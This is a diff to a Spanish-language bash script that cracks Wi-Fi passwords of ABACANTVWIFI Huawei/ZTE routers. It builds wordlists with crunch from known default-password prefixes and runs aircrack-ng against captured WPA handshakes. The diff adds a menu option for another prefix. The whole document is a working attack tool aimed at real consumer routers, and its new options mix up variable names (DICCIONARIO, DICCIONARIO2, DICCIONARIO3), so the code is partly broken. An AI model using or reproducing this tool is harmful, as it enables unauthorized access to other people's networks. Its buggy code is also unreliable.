@@ -1,13 +1,12 @@
 #!/bin/bash
-#0DAY para Routers Huawei Inc. Zte de ABA Cantv.
-
 # Este script hace uso de las contraseñas
 # por defecto en los routers ABACANTVWIFIxxxx Huawei Inc.
 # Escrito por @NyxZ3n, me hago responsable del uso del mismo
 # Pues ante la dictadura, yo también soy responsable de hacer
 # un cambio por el país. NO A LA DESINFORMACIÓN, 
 # DEBEMOS ESTAR COMUNICADOS SIEMPRE.
-# CharsetDiccionario = 85047928%%%%%% ó 8504792%%%%%%%
+# CharsetDiccionario = 85047928%%%%%%, 85047929%%%%%% 8504792%%%%%%%
+
 
 
 
@@ -216,7 +215,10 @@ echo "-------------------- Seleccione ---------------------"
 echo "--                                                 --"
 echo "-- 1. Ver handshakes             (Ctrl-C to exit  )--"
 echo "-- 2. Charset:85047928%%%%%%     (10 minutos aprox)--"
-echo "-- 3. Charset:8504792%%%%%%%     (1hora aprox     )--"
+echo "-- 3. Charset:85047929%%%%%%     (10 minutos aprox)--"
+echo "-- 4. Charset:8504792%%%%%%%     (1hora aprox     )--"
+echo "--                                                 --"
+echo "-- No descartes ninguna opción.                    --"
 echo "--                                                 --"
 echo "-----------------------------------------------------"
 echo ""
@@ -226,7 +228,7 @@ case $n in
 1)(xterm -hold -e sudo aircrack-ng $HANDSHAKE) & ;;
 
 2)clear
-echo "Empezando fuerzabruta de 6 dígitos numéricos."
+echo "Empezando fuerza bruta de 6 dígitos numéricos."
 echo ""
 echo "Por favor ingrese un nombre para el diccionario:"
 echo ""
@@ -239,15 +241,30 @@ echo ""
 read -p "Presione cualquier tecla para volver.";;
 
 3)clear
-echo "Empezando fuerzabruta de 7 dígitos numéricos."
+echo "Empezando fuerza bruta de 6 dígitos numéricos."
+echo ""
+echo "Por favor ingrese un nombre para el diccionario:"
+echo ""
+read DICCIONARIO
+echo ""
+crunch 14 14 -t 85047929%%%%%% -o $DICCIONARIO2
+echo ""
+sudo aircrack-ng -w $DICCIONARIO2 $HANDSHAKE
+echo ""
+read -p "Presione cualquier tecla para volver.";;
+
+
+
+4)clear
+echo "Empezando fuerza bruta de 7 dígitos numéricos."
 echo ""
 echo "Por favor ingrese un nombre para el diccionario:"
 echo ""
 read DICCIONARIO2
 echo ""
-crunch 14 14 -t 8504792%%%%%%% -o $DICCIONARIO2
+crunch 14 14 -t 8504792%%%%%%% -o $DICCIONARIO3
 echo""
-sudo aircrack-ng -w $DICCIONARIO2 $HANDSHAKE
+sudo aircrack-ng -w $DICCIONARIO3 $HANDSHAKE
 echo ""
 read -p "Presione cualquier tecla para volver.";;
 
